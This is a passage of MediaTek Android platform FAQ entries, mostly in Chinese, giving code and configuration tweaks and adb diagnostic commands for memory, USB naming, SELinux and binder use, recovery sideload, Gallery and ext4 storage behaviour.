#define PRODUCT_STRING "MT65xx Android Phone"
```

## [FAQ05354]  如何在preloader、uboot、lk、kernel中预置obj文件

```text
如何在preloader、uboot、lk、kernel中预置obj文件.docx 
```

## [tool]  [FAQ02684]  [SP FlashTool、SP Multiportdownload Tool] 客制化实现下载完成后自动开机

```text
一、flashtool:
BCB版本的FlashTool：
1. 修改version.cpp
static const bool          CUSTOMER_VER     = false;
 
2. 修改tboot_1.cpp
//---------------------------------------------------------------------------
int tboot_1::ArgFlashToolWatchDog(FlashTool_EnableWDT_Arg *p_wdt_arg) {
    assert(NULL != p_wdt_arg);
    memset(p_wdt_arg, 0, sizeof(FlashTool_EnableWDT_Arg));
    //timeout to reset bootRom
    p_wdt_arg->m_timeout_ms = 5000;
    p_wdt_arg->m_async = _FALSE;
    p_wdt_arg->m_reboot = _FALSE // _TRUE;=>_FALSE 
    return 0;
}
 
QT版本的Flashtool:
1. 修改version.cpp
static const bool          CUSTOMER_VER     = false;

2. 修改 WatchDogCommand.cpp
//---------------------------------------------------------------------------
void WatchDogCommand::ArgFlashToolWatchDog(FlashTool_EnableWDT_Arg *p_wdt_arg) {
     memset(wdt_arg, 0, sizeof(FlashTool_EnableWDT_Arg));
     wdt_arg->m_timeout_ms = 3000;
     wdt_arg->m_async = _FALSE;
     wdt_arg->m_reboot = _FALSE;
}
二、SP Multiportdownload Tool:
1，将SPMultiPortFlashDownloadProject.ini中的ForceWatchdogReset改为yes。
2，工具界面的EnableAutoPulling不能勾选。
 
注意：
MTK official release的tool不会开启这个feature.
产线tool也请不要开启这个功能, 会导致重启usb 枚举可能会受影响.
```

## [People]  [FAQ04080]  如何消除Phone模块导入Eclipse后产生的错误

```text
一般来说，alps工程中的系统应用导入Eclipse后一般都会有很多编译错误，下面我们会以Phone模块为例来说明如何消除这些编译错误，方面我们使用Eclipse进行开发与debug。
[SOLUTION] 
1、 将alps中的系统应用取出，例如我们取出./alps/package/apps/Phone/，在Eclipse中新建一个Android Project，将之前取出的Phone模块导入，然后我们就会发现有很多编译错误：
2、 由于Google原生SDK中android.jar的限制，我们需要继续添加一些jar文件参与编译解决编译错误。在我们编译整个alps工程时，其实我们需要的jar文件已经产生，路径为：
a) alps/out/target/common/obj/JAVA_LIBRARIES/framework_intermediates/classes.jar
b) alps/out/target/common/obj/JAVA_LIBRARIES/core_intermediates/classes.jar
c) alps/out/target/common/obj/JAVA_LIBRARIES/ext_intermediates/classes.jar
将以上三个jar文件分别重命名为framework.jar\core.jar\ext.jar，然后导入之前Eclipse建立的工程中：

查看一下效果，看看是否还有编译错误。
这里建议将SDK自带的android.jar删除，因为它会被优先编译，导致编译错误。
3、如果还有错误，可能是还要依赖其他的.java，将这些 .java 文件（.aidl / .java）copy 过来一起编译即可，这里注意package name要用对。
4、若是有发现API level的的编译错误，可以尝试使用在工程上右键---Android Tools---Clear Lint Markers来尝试忽略。这样编译错误就基本清理完毕。

注意事项：
Android 4.1之后的版本，Google开始对framework做拆分，例如有可能还需要加入secondary-framework.jar/telephony-common.jar等。可以仿照以上方式将需要的jar档导入即可
```

## [FAQ11803]  [USB] 修改USB存储在PC"我的电脑"中显示的label名称，如何解决label中的小写字母全部变成大写字母的问题?

```text
按照FAQ04906修改了USB存储在PC"我的电脑"中显示的label名称，代码中label名称由大小写字母组成，但是电脑端的显示全部变成了大写字母，比如新增的format()函数参数  -L  “AAbbCC"，但连接电脑显示的却是“AABBCC"。如何实现在电脑端的显示为实际的 “AAbbCC"?

[KEYWORD] 
USB存储 PC"我的电脑" label名称 小写字母 大写字母

[SOLUTION] 

请这样修改：
system/core/toolbox/newfs_msdos.c
static void
mklabel(u_int8_t *dest, const char *src) {
    int c, i;
    for (i = 0; i < 11; i++) {
    c = *src ? toupper(*src++) : ' '; //将此处toupper注释掉
    *dest++ = !i && c == '\xe5' ? 5 : c;
    }
}
```

## [USB]  [FAQ12212]  [USB名称修改系列]  如何修改USB MTP模式下，“设备与打印机”中Model项的显示?

```text
修改kernel/drivers/usb/gadget/f_mtp.c
 
static struct usb_string mtp_string_defs[]  = {
 /* Naming interface "MTP" so libmtp will recognize us */
 [INTERFACE_STRING_INDEX] .s = "MTP", //修改此处
 {  }, /* end of list */
};
```

## [FAQ11787]  [USB]  KK user版本使用adb会提示error: device offline

```text
KK user版本需要
1.检查adb版本是1.0.31
2.操作UI 点选弹出的框 OK
才可以使用。

原因是由于google升级SDK，将adb升级加入权限导致。您可以参考以下链接： 
The reason to appearing "device offline" in android 4.2.2 is that android has a security feature in 4.2.2 that create a whitelist of usb ports that can be used as debugging port.
After plugging deivce in usb and entering the command "adb devices" a popup window will be raised in your device and ask you to accept the connection:

After accepting RSA fingerprint of you usb you can now issue the "adb devices" again and see the device is no longer offline,
If you dont see the popup window, the reason is your adb version is old, your adb version must ne at least 1.0.31 (you can see the version using the command "adb version").

http://stackoverflow.com/questions/15079211/android-4-2-2-device-offline
```

## [CMD]  [FAQ04354]  一些查看内存状况的adb command

```text
请参考下面的1)2)3)抓取对应的信息，若需要MTK协助，请提供下面的信息，并将mtklog文件夹也一并附上

1) Use adb shell cat /proc/meminfo to calculate the free memory, as usual the free memory is  MemFree + cached
taking the follow example, te free memory is 5616K + 158632K
cat proc/meminfo
MemTotal:         483724 kB
MemFree:            5616 kB
Buffers:            2732 kB
Cached:           158632 kB
SwapCached:            0 kB
Active:           277336 kB
Inactive:          83232 kB
Active(anon):     197452 kB
Attention，in the phone menu setting->apps->running app, the free memory is MemFree + cached + background running app memory - SECOND_SERVER_MEM，you can refer to the follwoing for details：the function void refreshUi(boolean dataChanged) in RunningProcessView.java(/alps/package/apps/settings/src/com/android/setting/applications) (Related FAQ09452How to calculate cached free memory?)

2) Use adb shell procrank (Just ENGload) to find which process consume most memory, please refer to PSS

adb shell procrank
PID      Vss      Rss      Pss      Uss  cmdline
476   65312K   65284K   38499K   35560K  com.android.launcher
268   54916K   54880K   30001K   27000K  system_server
110   32196K   28988K   18924K   12432K  /system/bin/surfaceflinger
347   42400K   42320K   15445K   10704K  com.android.systemui


3) For the process in 2) who consume most memory， use adb shell showmap [pid]  (Just ENG load) to more details.  Take system_server for example， first get the pid by adb shell ps system_server:
adb shell ps system_server
USER     PID   PPID  VSIZE  RSS     WCHAN    PC         NAME
system    268   111   406736 54876 ffffffff 400e9c70 S system_server

Then  adb shell showmap 268 to find every .so and heap, stack memory consume.  Refer to the PSS
adb shell showmap 268
virtual                     shared   shared  private  private
size      RSS      PSS    clean    dirty    clean    dirty    # object
-------- -------- -------- -------- -------- -------- -------- ---- ------------------------------
72       20       20        0        0       20        0    1 /data/dalvik-cache/system@app@SettingsProvider.apk@classes.dex
352      148      103       32       16       48       52   18 /data/dalvik-cache/system@framework@android.policy.jar@classes.dex
1348       28        8       20        0        8        0    1 /data/dalvik-cache/system@framework@apache-xml.jar@classes.dex
956       60       13       52        0        8        0    1 /data/dalvik-cache/system@framework@bouncycastle.jar@classes.dex
24        8        0        8        0        0        0    1 /data/dalvik-cache/system@framework@core-junit.jar@classes.dex
3292     1056      126     1012        0       44        0    1 /data/dalvik-cache/system@framework@core.jar@classes.dex


其它内存相关FAQ，欢迎访问
FAQ04223如何查看Modem/Kernel/FrameBuffer的Footprint?
FAQ04354内存不足时查看内存使用情况的一些adb command
FAQ07759如何查看当前项目的physical memory layout
FAQ07760如何查看当前项目的virtual memory layout
FAQ09452手机cached free memory(剩余内存)计算方法
FAQ09454如何计算开机之后留给Linux Kernel可用的总内存
FAQ09456zram(内存压缩)介绍
FAQ10389如何关闭 zram/swap功能
```

## [FAQ09454]  如何计算开机之后留给Linux Kernel可用的总内存

```text
众所周知，RAM的layout里面会包含modem 以及 framebuffer部分，那如何计算剩余留给Linux kernel的内存呢?

[SOLUTION] 
请首先抓一份开机的uart log

1、搜索“available”，你会看到Memory:xxxxx/xxxxx available，这个xxxxx就是linux kernel可用总内存
[    0.000000] -(0)[0:swapper] Memory: 954092k/954092k available, 27924k reserved, 467968K highmem

2、如何计算的呢?
1) 搜索“PHY layout”，得到total ram size，modem size，以及framebuffer size
[    0.000000] -(0)[0:swapper]  [PHY layout] avaiable DRAM size = 0x40000000
[    0.000000] -(0)[0:swapper]  [PHY layout] FB       :   0xbfb00000 - 0xc0000000  (0x00500000)
[    0.000000] -(0)[0:swapper]  [PHY layout] MD       :   0xbc000000 - 0xbe000000  (0x02000000)
[    0.000000] -(0)[0:swapper]  [PHY layout] MD       :   0xba000000 - 0xbbc00000  (0x01c00000)
2) memory avaliable = total ram size - (modem size + framebuffer size + reserved)
        = 0x40000000 - (0x02000000 +0x01c00000 + 0x00500000 + 27924k  )
        //本例有两个modem
        = 954092k
其它内存相关FAQ，欢迎访问
FAQ04223如何查看Modem/Kernel/FrameBuffer的Footprint?
FAQ04354内存不足时查看内存使用情况的一些adb command
FAQ07759如何查看当前项目的physical memory layout
FAQ07760如何查看当前项目的virtual memory layout
FAQ09452手机cached free memory(剩余内存)计算方法
FAQ09456zram(内存压缩)介绍
```

## [性能]  [FAQ09452]  手机cached free memory(剩余内存)计算方法

```text
计算方法请参考：RunningProcessView.java(/alps/packages/apps/settings/src/com/android/setting/applications)里面的void refreshUi(boolean dataChanged)接口：
1、首先获取 /proc/meminfo信息
2、availMem = mMemInfoReader.getFreeSize() + mMemInfoReader.getCachedSize()
                - SECONDARY_SERVER_MEM; (因为不同平台，不同配置SECONDARY_SERVER_MEM会不同，如果想确定该值具体大小，建议您在这边自行加log打印该值)
3、 mLastAvailMemory = availMem;
      long freeMem = mLastAvailMemory + mLastBackgroundProcessMemory;
 
4、freeMem即为可用内存，已用内存即为meminfo.total - freeMem
 
所以，这里会包含background process占据的内存
 
其它内存相关FAQ，欢迎访问
FAQ04223 如何查看Modem/Kernel/FrameBuffer的Footprint?
FAQ04354 内存不足时查看内存使用情况的一些adb command
FAQ07759 如何查看当前项目的physical memory layout
FAQ07760 如何查看当前项目的virtual memory layout
FAQ09454 如何计算开机之后留给Linux Kernel可用的总内存
FAQ09456 zram(内存压缩)介绍
```

## [性能]  [FAQ09456]  zram(内存压缩)介绍

```text
下面是对Zram(内存压缩)一个简单介绍:
1. zram 又称内存压缩，Linux kernel会把不常用的内存进行压缩，以换出更多的内存供系统使用
    -- 平时空闲时候会做压缩，以备不时之需
    -- kernel 申请不到内存，会触发压缩机制
 
2. 只有user process的内存可被压缩
 
3. 压缩是有成本的，会影响performance
    -- 通常，launch app的时候会受影响
    -- 代码执行中，突然要大量内存的时候也会受到影响
 
4. 在LCA/non-LCA的项目都有可能Enable，目前为止只有72&82&92项目上面支持，其它暂不支持
 
若有更细节问题，可提e-service与MTK讨论
 
 
其它内存相关FAQ，欢迎访问
FAQ04223如何查看Modem/Kernel/FrameBuffer的Footprint?
FAQ04354内存不足时查看内存使用情况的一些adb command
FAQ07759如何查看当前项目的physical memory layout
FAQ07760如何查看当前项目的virtual memory layout
FAQ09452手机cached free memory(剩余内存)计算方法
FAQ09454如何计算开机之后留给Linux Kernel可用的总内存
```

## [sysui]  [FAQ11325]  KitKat版本，keyguard上状态栏透明的实现

```text
KitKat版本，android default实现了状态栏透明。
statusbar透明的属性是WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS;
navigationbar透明的属性是WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION;

keyguard界面状态栏透明实现是在KeyguardViewManager.java中:
if (shouldEnableTranslucentDecor()) {
    mWindowLayoutParams.flags |= WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS | WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION;
}
如需要关闭/打开锁屏界面状态栏透明，修改frameworks/base/core/res/res/values/config.xml中config_enableLockScreenTranslucentDecor变量值即可。
PS: 以上只针对锁屏界面的状态栏透明。
```

## [性能]  [FAQ14863]  perfomance问题的基本信息确认

```text
1:确认是否为eng版本?　adb shell getprop ro.build.type.  eng版本本身对perofamnce影响比大．
如果是eng版本出现的问题，请在user load确认是否有同样的问题．

2:　uart 是否有打开，adb shell cat /sys/module/printk/parameters/disable_uart
如果是Ｎ，表示你测试的版本是开uart的，很有可能你遇到perofamnce会跟这个相关．　
如果uart是开的，可以在有root权限下命令: echo 0 > /proc/sys/kernel/printk,然后再测试看看是否有问题.
```

## [CMD]  [FAQ12495]  如何用adb命令实现选择哪个麦克录音

```text
adb shell setprop streamin.micchoose 0  //代表双麦克
adb shell setprop streamin.micchoose 1  //代表主麦克
adb shell setprop streamin.micchoose 2  //代表副麦克
```

## [FAQ12424]  KK版本与JB版本拨号按键音的区别

```text
部分客户反馈KK平台拨号音比JB时间较长
[SOLUTION] 
kk版本拨号按键音时间长的原因是：
DialpadFragment.java里
private void keyPressed(int keyCode) {
    switch (keyCode) {
        case KeyEvent.KEYCODE_1:
            playTone(ToneGenerator.TONE_DTMF_1, TONE_LENGTH_INFINITE);//这个值TONE_LENGTH_INFINITE代表按下拨号按键会一直有声音，您按的时间长声音出来的声音就会长。如果将这个值TONE_LENGTH_INFINITE改为TONE_LENGTH_MS ，其他按键类似的修改，这样就是每个按键音都是一个固定时间TONE_LENGTH_MS
```

## [语言]  [FAQ12383]  如果选择Use system language，如何在键盘的空格上显示当前语言

```text
方法1：直接在MainKeyboardView.java (alps\packages\inputmethods\latinime\java\src\com\android\inputmethod\keyboard)  的drawSpacebar函数中对mNeesToDisplayLanguage的判断去掉。
//if(mNeesToDisplayLanguage){
......
//}
方法2：修改SubTypesSwitcher.java中的
needsToDisplayLanguages函数的返回值直接为true.
```

## [FAQ15086]  如何客制化自己的开机向导

```text
在开发过程中，可能需要客制化自己的开机向导，可以参考如下的方案。
[SOLUTION] 
可以参考一下之前敝司KK版本上的OOBE的实现，其主要有两个核心思想：
1.需要将APK的主Activity的Category声明为"android.intent.category.HOME"，并且设置其优先级要高于默认的Launcher。基中的优先级，可以根据自己的需求灵活设置。因为可能其他的Activity也会有同样的需求。
例如
<activity 
    android:name=".MainActivity"
    android:label="@string/app_name" >
    <intent-filter android:priority="10"> 
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.HOME" /> 
    </intent-filter>
</activity>
 
2.在完成自己的开机向导之后，需要通过PMS的接口禁止掉自己的应用，这样才能在后面的home-key不再起来。

例如：
/mediatek/packages/apps/OOBE/src/com/mediatek/oobe/basic/MainActivity.java
private void finishOOBE() {
    //disable WizardActivity
    PackageManager pm = getPackageManager();
    ComponentName name = new ComponentName(this, WizardActivity.class);
    int state = pm.getComponentEnabledSetting(name);
    if (state != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
        pm.setComponentEnabledSetting(name, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
        PackageManager.DONT_KILL_APP);
    }
}
```

## [FAQ15071]  ListView边缘的button经常点不中

```text
这是L1的新特性决定的，因为在L1版本的
/frameworks/base/core/java/android/widget/FastScroller.java
中，isPointInsideX的实现如下：
private boolean isPointInsideX(float x) {
    final float offset = mThumbImage.getTranslationX();
    final float left = mThumbImage.getLeft() + offset;
    final float right = mThumbImage.getRight() + offset;

    // Apply the minimum touch target size.
    final float targetSizeDiff = mMinimumTouchTarget - (right - left);
    final float adjust = targetSizeDiff > 0 ? targetSizeDiff : 0;

    if (mLayoutFromRight) {
        return x >= mThumbImage.getLeft() - adjust;
    } else {
        return x <= mThumbImage.getRight() + adjust;
    }
}
相对于L0的版本，会增加一个adjust的值，
而该函数又会影响listView是否会中断事件,导致事件传不到listItem上的button.
 
故该问题可以调小framework resource中，即
frameworks\base\core\res\res\values\dimens.xml
frameworks\base\core\res\res\values-xxx\dimens.xml中
R.dimen.fast_scroller_minimum_touch_target的值解决。
或者可以调整isPointInsideX的实现为L0.MP版本中的实现(即不adjust)，也
可以解决。
L0版本的实现如下：
private boolean isPointInsideX(float x) {
    if (mLayoutFromRight) {
        return x >= mThumbImage.getLeft();
    } else {
        return x <= mThumbImage.getRight();
    }
}
```

## [selinux]  [FAQ15089]  Android L 版本后native process 无法使用am pm 等命令的说明

```text
在android 5.0 后, 默认启用了Enforcing SELinux. Google 通过SELinux 严禁普通的native process 执行非system image 中的非exec类型的文件, 如data/dalvik-cache 下面的odex 文件, 从而native process 无法直接执行am, pm 等命令.
//external/sepolicy/domain.te
neverallow {
    domain
    -appdomain
    -dumpstate
    -shell
    userdebug_or_eng(`-su')
    -system_server
    -zygote
} { file_type -system_file -exec_type }:file execute;
neverallow {
    domain
    -appdomain # for oemfs
    -recovery # for /tmp/update_binary in tmpfs
} { fs_type -rootfs }:file execute;

通常我们解决的方式是，通过binder 直接使用 activity 等service接口, 直接向AMS 发送指令来规避这一条。 
注意这个同样要求你的process 有操作binder 的SELinux 权限，这个Google 不会限制。
在我们的代码中已经有很多类似的这样案例，大家可以参考：
frameworks/av/media/libmediaplayerservice/ActivityManager.cpp
/vendor/mediatek/proprietary/external/ds1_utility/ds1_utility.cpp
/vendor/mediatek/proprietary/external/batterywarning/batterywarning.cpp
/frameworks/av/services/audioflinger/AudioLosslessBTBroadcast.cpp
/vendor/mediatek/proprietary/packages/apps/MTKThermalManager/jni/thermald.cpp

通常首先：
#include <unistd.h>
#include <binder/IBinder.h>
#include <binder/IServiceManager.h>
#include <binder/Parcel.h>
#include <utils/String8.h>

(1). 获取am service 
sp<IServiceManager> sm = defaultServiceManager();
sp<IBinder> am = sm->getService(String16("activity"));

(2). 填充传送参数Parcel data, 准备好Parcel reply
data.writeInterfaceToken(String16("android.app.IActivityManager"));
.....

(3). 执行binder 
status_t ret = am->transact(XXXXXX_TRANSACTION, data, &reply); 
这些cmd 都定义在/frameworks/base/core/java/android/app/IActivityManager.java , 可选择查看.

(4). 解析返回的ret 和 reply.
比如：
if (ret == NO_ERROR) {
    int exceptionCode = reply.readExceptionCode();
    if (exceptionCode) {
        ALOGE("sendBroadcastMessage(%s) caught exception %d\n", action.string(), exceptionCode);
        return false;
    }
} else {
    return false;
}

Parcel 参数的填充过程可以参考：
/frameworks/base/core/java/android/app/ActivityManagerNative.java
CMD 参数列表可以参考：
/frameworks/base/core/java/android/app/IActivityManager.java
```

## [FAQ15083]  user版本无充电动画

```text
user版本无充电动画，而eng版本无此问题。如果把uartlog打开，无此问题，关闭uartlog，会有问题。
[SOLUTION] 
请在project的init.charging.rc中的mount ubifs后面都加上wait ：
mount ubifs ubi@system /system wait
mount ubifs ubi@system /system ro remount wait
mount ubifs ubi@userdata /data nosuid nodev wait
```

## [FAQ15079]  L版本如何添加全局宏代码控制开关

```text
L版本及之后，MTK采用google 编译架构，不再采用kk版本之前架构，android,kernel,lk,preloader各模块相互独立，
projectconfig.mk 中定义的宏将仅作用到 android 层
Version >= android 5.0
[SOLUTION] 
由于Projectconfig.mk只作用于Android层,而kernel ，lk ，和preloader 是不起作用的，需要宏控制对应代码时，请分别在对应地方定义。具体可参考以下：

preloader部分：
如需宏控制pl这部分代码时，需在alps/bootable/bootloader/preloader/custom/$project/$(project).mk中增加需要的宏。

lk部分：
如需宏控制lk这部分代码时，需在alps/bootable/bootloader/lk/project/$(Project).mk文件中添加控制宏。

kernel部分：
如需宏控制kernel这部分代码时,参考以下步骤新增kernel config.
1.请在您的driver code所在目录中的Kconfig文件增加您的宏定义
具体怎么写可以参考Kconfig中的其他宏定义
举个例子:
config MTK_FB
bool "MediaTek Framebuffer Driver"
depends on FB
default y
select FB_SOFT_CURSOR
---help---
This selects the MediaTek(R) frame buffer driver.
If you want to use MediaTek(R) frame buffer diver, say Y.
2.在您对应的kernel defconfig配置文件中(如：kernel-3.10/arch/arm/configs/$(project)_defconfig(user及userdebug版本时需在此文件中配置)或$(project)_debug_defconfig(eng版本时需在此文件中配置))中设定您增加的宏的值,如 CONFIG_MTK_FB=y
3.在您的kernel代码中就可使用CONFIG_MTK_FB这个宏了

Android部分：
如需宏控制Android c,c++代码时,参考以下步骤
1.ProjectConfig.mk中定义您需要添加的宏CONFIG_XXX = yes
2.Android.mk中根据ProjectConfig.mk中添加的宏设定LOCAL_CFLAGS
ifeq ($(CONFIG_XXX),yes)
LOCAL_CFLAGS += -DCONFIG_XXX=yes
endif
3.接下来，您的code中就可以使用您定义的CONFIG_XXX宏了
务必注意，自L版本之后preloader/lk/kernel/android已经完全独立，代码不会有任何耦合，请参考以上方法设置控制宏。
```

## [log]  [FAQ14878]  如何打开binder的log

```text
在分析perfromances问题时，常常会有些问题时卡在频繁的binder调用的地方，但binder调用如果时间小于500ms，是没有log出来的。
那如何将这些binder调用信息打印出来了? 
[SOLUTION] 
可以在我司DCC(http://dcc.mediatek.inc/)上搜索HowToOpenbinderLog.docx，该文档内有详细介绍。
```

## [CMD]  [FAQ15065]  如何用命令行强制开关HWUI

```text
强制开HWUI：
adb shell setprop persist.sys.ui.hw true
adb shell setprop debug.viewroot.disableHW false
adb shell stop
adb shell start

强制关HWUI：
adb shell setprop debug.viewroot.disableHW true
adb shell setprop persist.sys.ui.hw false
adb shell stop
adb shell start
```

## [FAQ14814]  如何定义App的Max Adj

```text
AMS 有一套完整的算法来调整进程的 ADJ. 比如当进程退出使用后, AMS 会将该进程的 ADJ 提高. 从而使得 Memory 不足时 Low Memory Killer 可以有依据杀死进程. 
但在产品层面, 总有一些进程是产品特别关心的. 对于这些进程, 不希望 ADJ 调整太高, 避免被 LMK 杀死. 可以有几种方法实现该需求. 比如:
1. 将进程设置为 Persistent. 使进程持续占据 Memory 不被杀死
2. 调整 ADJ 的最大许可值. 在 Memory 不是特别紧张时, 可以保证该进程不被杀死. 而当 Memory 特别紧张时, 又可以被 LMK 杀死, 从而释放出 Memory 给前台进程使用.
这里介绍方法 2.

[SOLUTION] 
首先需要加入 Patch ALPS01995207.
然后修改 /vendor/mediatek/proprietary/frameworks/base/packages/FwkPlugin/src/com/mediatek/op/amsplus/DefaultCustomizedOomExt.java 中的函数 getCustomizedAdj(String processName). 如果传入的是需要重新定义 ADJ 的进程, 则返回期望的 ADJ.
需要注意的是, 这个修改对 AMS 的策略会产生影响. 必然会影响到其他进程. 所以请一定斟酌放入 getCustomizedAdj 中的进程, 以及期望的 ADJ.
如果需要 Check 修改结果, 需要打开 AMS 的 DEBUG_OOM_ADJ 开关. 当该进程的 ADJ 按照 getCustomizedAdj 的返回结果重新设定时, 会打印如下 trace:
getCustomized(XXXX) with adj = Y cur = Z
其中 Y 表示 getCustomized 给出的 ADJ, Z 表示 AMS 计算出的 ADJ.
```

## [ota]  [FAQ14973]  Adb sideload OTA升级失败报错："E: unknown volume for path [/sideload/pakage.zip] ”

```text
操作步骤：
1. Enter the recovery mode by pressing the buttons with Power + Volume
2. Select the "Recovery"
3. Pressing the button "Power" and soon after the button "Volume +"
4. Select the "Apply update from ADB"
5. On the PC running the command "adb sideload <filename>"
6. Check the behavior

实际结果：
Is not possible to carry out the recovery and is shown msg "Sideload aborted"
The log is shown:
E: unknown volume for path [/sideload/pakage.zip] 
E: can`t mount /sideload/package.zip
I: GPT is supported!
[SOLUTION] 
在bootable/recovery/roots.cpp如下函数添加code：
1、ensure_path_mounted函数开始位置加上：
if (!strncmp(path, "/sideload", strlen("/sideload"))) {//add
    return 0;//add
}//add
Volume* v = volume_for_path(path);

2、同样ensure_path_unmounted函数开始位置加上：
if (!strncmp(path, "/sideload", strlen("/sideload"))) {//add
    return 0;//add
}//add
Volume* v = volume_for_path(path);
```

## [FAQ14889]  [Gallery] 移动定制机（OP01）三方apk保存图片后，在gallery中不能正常显示（含图）

```text
问题确认：
Step 1. 首先确认database中图片插入数据库的宽高信息为0
方法一：
可通过mobile_log来确认（无width 和 height 信息，或赋值为0）：
08-24 16:33:29.582257   942   953 V MediaProvider: insertFile<<<: values=bucket_id=1606349962 media_type=1 storage_id=65537 date_modified=1440405209 parent=13 format=14337 file_name=Moji_20150824_1633.jpg bucket_display_name=Moji file_type=1 title=Moji_20150824_1633.jpg mime_type=image/jpeg date_added=1440405209 _display_name=1440405209520 _size=351585 datetaken=1440405209000 _data=/storage/sdcard0/DCIM/Moji/Moji_20150824_1633.jpg, rowId=608
 
方法二：
可通过导出手机中的database文件external.db，直接使用database工具查看；
database文件路径：/data/data/com.android.providers.media/databases/
 
Step 2. 确认调用了TileImageViewAdaptor.java文件的updateWidthAndHeight()方法更新宽和高为0
可通过mobile_log来确认：
08-24 16:33:53.416043 1944 1944 I Gallery2/TileImageViewAdapter: <updateWidthAndHeight> mImageWidth 0, mImageHeight 0
08-24 16:33:53.418353 1944 1944 I Gallery2/Op01ImageOptionsExt: <updateMediaType> mediaType [mediaType = NORMAL,width = 0,height = 0,orientation = 0,mimeType = image/jpeg,isDRM = 0,drmMethod = 0,groupID = 0,groupIndex = 0,groupCount = 0,bestShotMark = 0,filePath = /storage/sdcard0/DCIM/Moji/Moji_20150824_1633.jpg,uri = null,isVideo = false,isLivePhoto = false,isSlowMotion = false,bucketId = 1606349962,id = 608,fileSize = 351585,duration = 0,relateData = null, dateModifiedInSec = 1440405209, isRefocus = false] 
 
修改方案：
方案一：
从根源上来解决：
push 第三方apk，修改其插入数据库时，对宽和高进行赋值；
 
方案二：
在gallery中针对这种database中保存图片宽和高为0的情况进行优化：
修改TileImageViewAdaptor.java文件的如下方法
public void updateWidthAndHeight(MediaItem item) {
    if (item != null) {
        // add by MTK begin
        if ((item.getWidth()==0) || (item.getHeight()==0)) {
            Log.d(TAG, " Item width and height are 0, return");
            return;
        }
        // add by MTK end
        mImageWidth = item.getWidth();
        mImageHeight = item.getHeight();
        Log.i(TAG, " mImageWidth " + mImageWidth + ", mImageHeight " + mImageHeight);
    }
}
```

## [FAQ14937]  [Storage] Download开机后恢复出厂设置userdata可用空间变小

```text
在开启MTK_SHARED_SDCARD时，userdata分区会自适应emmc剩余空间的大小，您可能会注意到download bin档后开机，透过adb shell df或Setting -> Storage查询到的内部存储空间(/data)大小会比恢复出厂设置后稍大。
但是第二次再做恢复出厂设置，/data的空间大小就不会再发生变化，一直保持第一次恢复出厂后的大小。除非再次重新download，又会发生这样的现象。


[SOLUTION] 
编译时分区表设定的userdata分区size较小（大概1GB多），build时生成的userdata.img是以这个较小的size生成的。从build log中会找到类似以下这段:
make_ext4fs -s -T -1 -S out/target/product/sisley2OTP/root/file_contexts -l 1237319680 -a data out/target/product/sisley2OTP/userdata.img out/target/product/sisley2OTP/data

Creating filesystem with parameters:
Size: 1237319680   //0x49c00000
Block size: 4096
Blocks per group: 32768
Inodes per group: 7552
Inode size: 256
Journal blocks: 4720
Label: 
Blocks: 302080
Block groups: 10
Reserved block group size: 79
Created filesystem with 33/75520 inodes and 10340/302080 blocks

可以看到这个例子中生成ext4 image时总的size为0x49c00000 (1180MB)。
而download后第一次开机后会执行ext4 resize操作，根据实际userdata分区的大小修改ext4 fs里面的相关参数，以达到文件系统自适应emmc实际大小的目的。 可以从kernel log中找到类似下面的log:

[    7.677582] .(5)[180:resize_ext4] resize: Size for partition(/dev/block/platform/mtk-msdc.0/by-name/userdata) is 12064256K.  //0x2E0580000，userdata分区实际的size
[    7.678956] .(5)[180:resize_ext4] resize: Size in superblock is 1208320K.  //0x49C000000, userdata在分区表中的size
[    7.679793] .(5)[180:resize_ext4] resize: Size will (maybe) resize to(after adjust) is 12064256K.
[    7.681178] .(5)[180:resize_ext4] resize: Running /system/bin/resize2fs on /dev/block/platform/mtk-msdc.0/by-name/userdata
[    8.169390] .(0)[180:resize_ext4] resize: Resize ext4 return 0

在执行恢复出厂设置时，会擦除userdata分区，并重新利用make_ext4fs创建新的文件系统，这时候就是直接根据userdata分区的实际大小来创建ext4 fs。从factory reset recovery log中会找到类似以下这段:

Formatting /data...
format /data start=1420131485 
I:GPT is supported!
Creating filesystem with parameters:
Size: 12353798144     //0x2E0580000
Block size: 4096
Blocks per group: 32768
Inodes per group: 8112
Inode size: 256
Journal blocks: 32768
Label: 
Blocks: 3016064
Block groups: 93
Reserved block group size: 743
Created filesystem with 11/754416 inodes and 87558/3016064 blocks
format end=1420131494 duration=9

对比build时创建的userdata.img和factory reset时在userdata分区创建文件系统，由于userdata分区的size在这两种情况下不同，那么创建ext4时一些参数就会被自动调整，这里看到最重要的就是 Journal blocks差异较大，build时是 4720，recovery时是32768，差了110MB左右。inode per group也会有些差异，这些都是导致df出来的分区大小差异的原因。因为ext4 resize操作不会调整这些参数值，只会调整super block里面的参数，以及总的block和group数目。

一般手机只会在工厂产线上遇到这样的问题，手机在产线上一定会最后做factory reset，end user一般只会做OTA升级，不会再遇到这样的问题。
```

## [语言]  [FAQ14881]  如何修改设置中语言显示的名称(如将"繁体中文（台湾）"修改为　　"中文（繁体）")

```text
如何修改设置中语言显示的名称(如将　"繁体中文（台湾）"　修改为　"中文（繁体）")
语言名称的显示是在LocalePicker.java中(alps/framework/base/core/java/com/android/internal/app)函数getAllAssetLocales()中做的．如要修改可参考如下方案．
[SOLUTION] 
可将LocalePicker.java中成员变量　
private static final boolean DEBUG = false；　将DEBUG的值置为true, 
然后抓一份log,　进设置－＞语言，停止抓log, 从log中会包含函数getAllAssetLocales(Context context, boolean isInDevelopeMode)打出的log，这个函数是把各语言加到一个list中，各语言显示的名称也有打出来，　可以对着log打印的地方修改这个显示的名称．
```

## [FAQ14938]  [Storage] 关于文件系统空间预留的说明

```text
也许你在测试时无意中发现虽然把/data或/cache填满了，无法再写入数据，但是透过stat查看分区文件系统状态，free blocks并不等于0. 

[SOLUTION] 
kernel-3.10 ext4模块本身会预留2%左右的分区存储空间做reserved空间，专门为ext4自己保留。在super.c (kernel-3.10\fs\ext4)的ext4_calculate_resv_clusters()这个函数中有以下这段code:
/*
* By default we reserve 2% or 4096 clusters, whichever is smaller.
* This should cover the situations where we can not afford to run
* out of space like for example punch hole, or converting
* uninitialized extents in delalloc path. In most cases such
* allocation would require 1, or 2 blocks, higher numbers are
* very rare.
*/
